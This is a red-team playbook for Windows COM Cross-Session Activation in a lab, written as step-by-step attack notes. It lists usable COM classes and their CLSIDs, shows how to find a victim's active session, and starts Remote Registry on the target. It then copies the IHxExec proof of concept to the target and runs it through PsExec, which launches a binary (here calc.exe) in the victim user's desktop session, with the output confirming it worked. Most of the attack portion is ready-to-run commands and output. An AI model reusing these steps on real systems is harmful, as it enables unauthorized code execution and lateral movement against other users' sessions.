# Cross-Session Activation — Playbook Notes

## Step 1: COM Objects Enumeration

**Goal:** Find COM classes that can be used for Cross-Session Activation.

**Must-have conditions:**
- `RunAs = Interactive User`
- Launch/Activation permissions allow the attacker (preferably Remote Activation)
- COM interface has useful methods for code execution

**Tool:**
```
PermissionHunter.exe -outfile result -outformat xlsx
```
(from COMThanasia)

**Required permission:** Run as **Administrator** (elevated).  
Why: Needs full read of `HKLM\SOFTWARE\Classes\AppID` / `CLSID` and Launch/Access permission ACLs. Standard user gets incomplete results.

**Filter results for:**
- RunAs = Interactive User
- LaunchAccess = Remote Activation
- LaunchPrincipal = Everyone / Administrators / Empty

**Common useful CLSIDs:**
- Speech Runtime → `{38FE8DFE-B129-452B-A215-119382B89E3D}`
- sppui → `{F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}`
- HelpPane / IHxHelpPaneServer
- Auth UI CredUI

**Note:** Not every Interactive User CLSID is usable — the interface must support useful methods.

### Filtered Candidates (from PermissionHunter)

| Application ID | Application Name | Run As | Launch Access | Launch Principal | Launch Type | Access Principal | Auth Level | Imp Level | CLSIDs |
|----------------|------------------|--------|---------------|------------------|-------------|---------------|------------|-----------|--------|
| {924DC564-16A6-42EB-929A-9A61FA7DA06F} | Authentication UI CredUI Out of Proc Helper for Non-AppContainer Clients | Interactive User | LocalLaunch. RemoteLaunch. LocalActivation. RemoteActivation | BUILTIN\Administrators | AccessAllowed | NT AUTHORITY\SYSTEM |  |  | {924DC564-16A6-42EB-929A-9A61FA7DA06F} |
| {B8C54A54-355E-11D3-83EB-00A0C92A2F2D} | Windows Media Player | Interactive User | LocalLaunch. RemoteLaunch. LocalActivation. RemoteActivation | Everyone | AccessDenied | NT AUTHORITY\SELF |  |  | {91778246-9BE4-4713-A651-E833B853CC30} |
| {1111A26D-EF95-4A45-9F55-21E52ADF9887} | MpUx Agent Host | Interactive User | LocalLaunch. RemoteLaunch. LocalActivation. RemoteActivation | BUILTIN\Administrators | AccessAllowed | BUILTIN\Administrators |  |  |  |
| {1725704B-A716-4E04-8EF6-87ED4F0A180A} | Speech Runtime COM | Interactive User | LocalLaunch. RemoteLaunch. LocalActivation. RemoteActivation | BUILTIN\Administrators | AccessAllowed | NT AUTHORITY\SYSTEM |  |  | {03DE7B30-9300-4FA9-AF69-BA09497107A2}; {265b1075-d22b-41eb-bc97-87568f3e6dab}; {38FE8DFE-B129-452B-A215-119382B89E3D}; {58598185-CF77-4407-B011-0C8282EF681F}; {9663C85F-3C7B-4E02-97AD-906E135500DC}; {D7FD466D-F6CF-4C8E-86DD-12E9B0FDAE48}; {EDA59C23-FCB4-44AF-BFE0-3708C08A212D} |
| {1D278EEF-5C38-4F2A-8C7D-D5C13B662567} | Security Health Agent Host | Interactive User | LocalLaunch. RemoteLaunch. LocalActivation. RemoteActivation | BUILTIN\Administrators | AccessAllowed | BUILTIN\Administrators |  |  |  |
| {2A81FE91-95D7-487E-BBF8-B03308E54207} |  | Interactive User | LocalLaunch. RemoteLaunch. LocalActivation. RemoteActivation |  | AccessAllowed |  |  |  |  |
| {2A81FE91-95D7-487E-BBF8-B03308E54207} |  | Interactive User | LocalLaunch. RemoteLaunch. LocalActivation. RemoteActivation | BUILTIN\Administrators | AccessAllowed | NT AUTHORITY\SYSTEM |  |  |  |
| {362cc086-4d81-4824-bbb5-666d34b3197d} | Windows Push Notification Platform | Interactive User | LocalLaunch. RemoteLaunch. LocalActivation. RemoteActivation | BUILTIN\Administrators | AccessAllowed |  |  |  |  |
| {37399c92-dc3f-4b55-ae5b-811ee82398ad} | AppServiceContainerBroker | Interactive User | LocalLaunch. RemoteLaunch. LocalActivation. RemoteActivation | BUILTIN\Administrators | AccessAllowed |  |  |  | {37399c92-dc3f-4b55-ae5b-811ee82398ad} |
| {4839DDB7-58C2-48F5-8283-E1D1807D0D7D} | ShellServiceHost | Interactive User | LocalLaunch. RemoteLaunch. LocalActivation. RemoteActivation | BUILTIN\Administrators | AccessAllowed |  |  |  |  |
| {59c7f6ec-7d18-412f-a68e-877982768e61} | Authentication UI Terminal Services Bump Dialog | Interactive User | LocalLaunch. RemoteLaunch. LocalActivation. RemoteActivation | BUILTIN\Administrators | AccessAllowed | NT AUTHORITY\NETWORK SERVICE |  |  |  |
| {7E55A26D-EF95-4A45-9F55-21E52ADF9878} | Security Health Agent Host | Interactive User | LocalLaunch. RemoteLaunch. LocalActivation. RemoteActivation | BUILTIN\Administrators | AccessAllowed | BUILTIN\Administrators |  |  |  |
| {924DC564-16A6-42EB-929A-9A61FA7DA06F} | Authentication UI CredUI Out of Proc Helper for Non-AppContainer Clients | Interactive User | LocalLaunch. RemoteLaunch. LocalActivation. RemoteActivation | BUILTIN\Administrators | AccessAllowed | NT AUTHORITY\SYSTEM |  |  | {924DC564-16A6-42EB-929A-9A61FA7DA06F} |
| {a463fcb9-6b1c-4e0d-a80b-a2ca7999e25d} |  | Interactive User | LocalLaunch. RemoteLaunch. LocalActivation. RemoteActivation | BUILTIN\Administrators | AccessAllowed | NT AUTHORITY\SELF |  |  | {a463fcb9-6b1c-4e0d-a80b-a2ca7999e25d} |
| {b21858c6-9711-4257-99c8-5c0084bebce1} | DockInterface COM server | Interactive User | LocalLaunch. RemoteLaunch. LocalActivation. RemoteActivation | BUILTIN\Administrators | AccessAllowed | BUILTIN\Administrators |  |  |  |
| {B8C54A54-355E-11D3-83EB-00A0C92A2F2D} | Windows Media Player | Interactive User | LocalLaunch. RemoteLaunch. LocalActivation. RemoteActivation | Everyone | AccessDenied | NT AUTHORITY\SELF |  |  | {91778246-9BE4-4713-A651-E833B853CC30} |
| {f59bbec1-0907-4464-b04d-1da329585370} | ActivatableApplicationRegistrar | Interactive User | LocalLaunch. RemoteLaunch. LocalActivation. RemoteActivation | BUILTIN\Administrators | AccessAllowed |  |  |  | {dea794e0-1c1d-4363-b171-98d0b1703586} |

**Recommended first targets:**
1. Speech Runtime — `{38FE8DFE-B129-452B-A215-119382B89E3D}`
2. Auth UI CredUI — `{924DC564-16A6-42EB-929A-9A61FA7DA06F}`

---

## Step 2: Session Enumeration

**Requirement:** Cross-Session Activation requires an active interactive user session on the target. In this test an RDP session was used so the victim account remained in an Active state, which was then enumerated on the victim machine before activation.

**Goal:** Identify active interactive sessions and their Session IDs on the target.

**Command (from attacker):**
```bash
quser /server:<TARGET-IP>
```

**Example:**
```bash
quser /server:10.110.0.101
```

**Sample output:**
```
USERNAME              SESSIONNAME        ID  STATE
victim                rdp-tcp#0          3  Active
```

**Notes:**
- Only sessions in **Active** state are reliable targets.
- Session IDs are local to each machine (not unique across the domain).
- Disconnected (Disc) sessions are less reliable for CSA.

---

## Step 3: Remote Registry

**Why it is critical:**  
Remote Registry is required for remote COM hijacking and for many remote CSA tooling paths. It allows the attacker to read/write registry keys on the target (for example to plant COM hijacks under the victim user’s HKCU or to inspect AppID/CLSID permissions). Without it, pure remote registry-based steps fail even if DCOM activation itself works.

**Check status (from attacker):**
```bash
sc \\10.110.0.101 query RemoteRegistry
```

**Start the service:**
```bash
sc \\10.110.0.101 start RemoteRegistry
```

**Enable automatic start (optional):**
```bash
sc \\10.110.0.101 config RemoteRegistry start= auto
sc \\10.110.0.101 start RemoteRegistry
```

**Note:** When using PsExec to run a local PoC already on the target, Remote Registry is less critical. It becomes essential for remote COM hijack + SpeechRuntimeMove-style attacks.

---

## Step 4: IHxExec (HelpPane PoC)

**What it does:**  
IHxExec uses the IHxHelpPaneServer COM object (`RunAs = Interactive User`) to perform Cross-Session Activation. It calls `SetSessionId` then activates the COM class in the target session and invokes `Execute()` to run an arbitrary binary in the victim user’s context.

**Transfer to victim machine:**  
Copy IHxExec.exe to the target (e.g. `C:\Temp\IHxExec.exe`).

```bash
copy IHxExec.exe \\10.110.0.101\C$\Temp\
```

**Execute with admin privileges (from attacker via PsExec):**
```bash
psexec \\10.110.0.101 -accepteula -s C:\Temp\IHxExec.exe -s <SessionID> -c C:\Windows\System32\calc.exe
```

**Example (Session 3 = victim Active session):**
```bash
psexec \\10.110.0.101 -accepteula -s C:\Temp\IHxExec.exe -s 3 -c C:\Windows\System32\calc.exe
```

**Expected result:**  
`calc.exe` launches on the **victim machine** under the **victim user’s session** (visible on the victim desktop). Exit code 0 indicates success.

**Lab observation:**  
When the correct Active Session ID was used, output showed:
```
[+] Executing binary: file:///C:\Windows\System32\calc.exe
error code 0
```
